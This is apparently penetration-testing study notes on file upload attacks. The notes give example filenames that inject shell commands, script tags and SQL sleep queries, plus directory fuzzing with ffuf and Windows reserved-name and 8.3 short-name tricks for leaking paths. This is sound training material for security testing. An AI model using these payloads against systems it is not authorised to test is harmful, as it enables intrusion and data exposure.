# Other Upload Attacks

# Overview

Besides:

- arbitrary file upload
    
- limited file upload
    

there are additional file upload attack techniques that may help during:

- web penetration testing
    
- bug bounty hunting
    

These attacks target:

- file names
    
- upload paths
    
- Windows behaviors
    
- backend processing logic
    

---

# Injections in File Name

## Concept

Instead of attacking:

- file content
    

attacker abuses:

- uploaded file name
    

If application:

- displays filename
    
- passes filename into OS commands
    
- inserts filename into SQL queries
    

then injection vulnerabilities may occur.

---

# Command Injection via File Name

## Malicious Filenames

Examples:

```text
file$(whoami).jpg
```

```text
file`whoami`.jpg
```

```text
file.jpg||whoami
```

---

# Why This Works

Suppose backend uses:

```bash
mv $filename /tmp/
```

If filename is:

```text
file$(whoami).jpg
```

command becomes:

```bash
mv file$(whoami).jpg /tmp/
```

Shell executes:

```bash
whoami
```

before running command.

---

# Result

Can lead to:

- command execution
    
- Remote Code Execution (RCE)
    

---

# Important Characters

|Character|Meaning|
|---|---|
|`$()`|command substitution|
|`` ` ` ``|command execution|
|`||
|`;`|command separator|

---

# XSS via File Name

## Malicious Filename

```html
<script>alert(window.origin)</script>.jpg
```

---

# How It Works

If application displays filename without sanitization:

```html
Uploaded:
<script>alert(window.origin)</script>.jpg
```

Browser executes JavaScript.

---

# Result

Leads to:

- Stored XSS
    

---

# SQL Injection via File Name

## Malicious Filename

```text
file';select+sleep(5);--.jpg
```

---

# Vulnerable Backend Example

```sql
INSERT INTO files(name) VALUES('$filename')
```

becomes:

```sql
INSERT INTO files(name)
VALUES('file';select sleep(5);--.jpg')
```

---

# Result

Can lead to:

- SQL Injection
    
- database manipulation
    
- authentication bypass
    

---

# Upload Directory Disclosure

# Problem

Sometimes:

- uploaded file URL is hidden
    
- upload directory unknown
    

---

# Methods To Discover Upload Directory

## 1. Fuzzing

Use directory brute force:

```bash
ffuf -u http://target/FUZZ -w wordlist.txt
```

Look for:

```text
uploads
images
files
profile_images
avatars
```

---

# 2. Read Source Code

Use:

- LFI
    
- XXE
    

to read application source code.

Can reveal:

- upload directory
    
- naming scheme
    
- allowed extensions
    

---

# 3. Trigger Errors

Applications often reveal paths during failures.

---

# File Collision Attack

Upload:

```text
same filename twice
```

or send:

```text
simultaneous upload requests
```

---

# Possible Error

```text
Cannot write file:
/var/www/html/uploads/file.jpg
```

---

# Result

Discloses:

- upload path
    
- server structure
    

---

# Long Filename Attack

Upload filename with:

```text
5000+ characters
```

---

# Why

Improper handling may trigger:

- filesystem errors
    
- buffer issues
    
- stack traces
    

---

# Result

May reveal:

- backend language
    
- upload directory
    
- full paths
    

---

# Windows-Specific Attacks

# Reserved Characters

Windows reserves:

```text
| < > * ?
```

---

# Example

Upload:

```text
test?.jpg
```

Windows rejects file creation.

---

# Result

Application may reveal:

```text
C:\xampp\htdocs\uploads\
```

---

# Reserved Filenames

Windows reserved names:

```text
CON
COM1
LPT1
NUL
PRN
AUX
```

---

# Example

Upload:

```text
CON.jpg
```

---

# Result

Windows cannot create file.

May disclose:

- internal paths
    
- upload locations
    

---

# Windows 8.3 Filename Convention

# Concept

Older Windows used:

```text
8.3 filenames
```

Format:

- 8 characters filename
    
- 3 characters extension
    

Long names shortened using:

```text
~
```

---

# Example

Real file:

```text
hackthebox.txt
```

Short version:

```text
HAC~1.TXT
```

---

# Multiple Similar Files

```text
hackthebox.txt
hackthelab.txt
```

may become:

```text
HAC~1.TXT
HAC~2.TXT
```

---

# Exploitation

Upload:

```text
WEB~1.CON
```

Windows may interpret it similarly to:

```text
web.config
```

---

# Possible Impacts

## 1. Information Disclosure

Errors may reveal:

- sensitive paths
    
- existing files
    

---

## 2. DoS

Overwriting config files may:

- crash IIS
    
- break application
    

---

## 3. Access Private Files

Applications may block:

```text
secretfile.txt
```

but not:

```text
SECRE~1.TXT
```

---

# Advanced File Upload Attacks

# Concept

Uploaded files are often:

- processed
    
- renamed
    
- compressed
    
- converted
    

Unsafe processing can introduce vulnerabilities.

---

# Vulnerable Processing Examples

|Processing Action|Possible Risk|
|---|---|
|Video encoding|RCE / XXE|
|File compression|Zip bombs|
|Metadata parsing|XSS|
|File renaming|Path traversal|
|XML parsing|XXE|

---

# ffmpeg XXE Example

Some vulnerable versions of:

```text
ffmpeg
```

allowed XXE through malicious AVI files.

---

# Why Advanced Attacks Are Difficult

Requires:

- understanding backend processing
    
- analyzing libraries
    
- studying parsers
    
- custom exploit development
